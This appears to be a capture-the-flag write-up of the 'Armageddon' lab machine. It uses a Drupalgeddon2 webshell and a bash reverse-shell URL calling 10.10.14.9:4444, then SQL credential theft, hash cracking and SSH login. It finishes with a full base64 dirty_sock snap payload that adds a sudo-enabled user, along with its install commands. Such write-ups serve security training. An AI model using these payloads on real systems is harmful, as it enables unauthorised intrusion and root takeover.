# Armageddon

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (2030).png" alt=""><figcaption></figcaption></figure>

Doing a detailed scan reveals that port 80 is running Drupal 7.

<figure><img src="../../../.gitbook/assets/image (1095).png" alt=""><figcaption></figcaption></figure>

### Drupalgeddon

Because this was running Drupal, we can directly head to the CHANGELOG.txt directory to view the version used.

<figure><img src="../../../.gitbook/assets/image (3277).png" alt=""><figcaption></figcaption></figure>

Drupal 7.56 is vulnerable to the Drupalgeddon2 RCE exploit.

{% embed url="https://www.exploit-db.com/exploits/44449" %}

We can use this to easily put a webshell on the page. The exploit would put a `shell.php` file on the webserver that takes a `c` parameter for the RCE.

<figure><img src="../../../.gitbook/assets/image (2635).png" alt=""><figcaption></figcaption></figure>

By going to `http://10.10.10.223/shell.php?c=bash+-i+>&+/dev/tcp/10.10.14.9/4444+0>&1`, we would get a shell.

<figure><img src="../../../.gitbook/assets/image (1695).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SQL Creds

Within the Drupal configuration files at `/sites/default/settings`, we can find a password for the SQL database.

<figure><img src="../../../.gitbook/assets/image (2982).png" alt=""><figcaption></figcaption></figure>

With this, we can login to the SQL server and enumerate the database. By dumping the users table from the drupal database, we can find a username and hash.

<figure><img src="../../../.gitbook/assets/image (642).png" alt=""><figcaption></figcaption></figure>

Hash is easily cracked with `john`.

<figure><img src="../../../.gitbook/assets/image (4076).png" alt=""><figcaption></figcaption></figure>

Then we can SSH in as the `brucetherealadmin` user using this credential.

### Dirty Sock

When checking sudo privilges of this machine, we see that we can run `snap`.

<figure><img src="../../../.gitbook/assets/image (1896).png" alt=""><figcaption></figcaption></figure>

By checking the snap version, we can see that this is not vulnerable to the dirty sock exploit because it is updated.&#x20;

<figure><img src="../../../.gitbook/assets/image (1477).png" alt=""><figcaption></figcaption></figure>

However, because we run `snap` as root, this means that we can create a malicious snap package to be downloaded, and the imported package would run the dirty\_sock exploit.

The exploit can be found here.

{% embed url="https://github.com/initstring/dirty_sock" %}

We can then run these commands to gain a root shell:

{% code overflow="wrap" %}
```bash
python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > exploit.snap

sudo snap install exploit.snap --dangerous --devmode
su dirty_sock
# password is dirty_sock
```
{% endcode %}

This would spawn a root shell:

<figure><img src="../../../.gitbook/assets/image (3058).png" alt=""><figcaption></figcaption></figure>
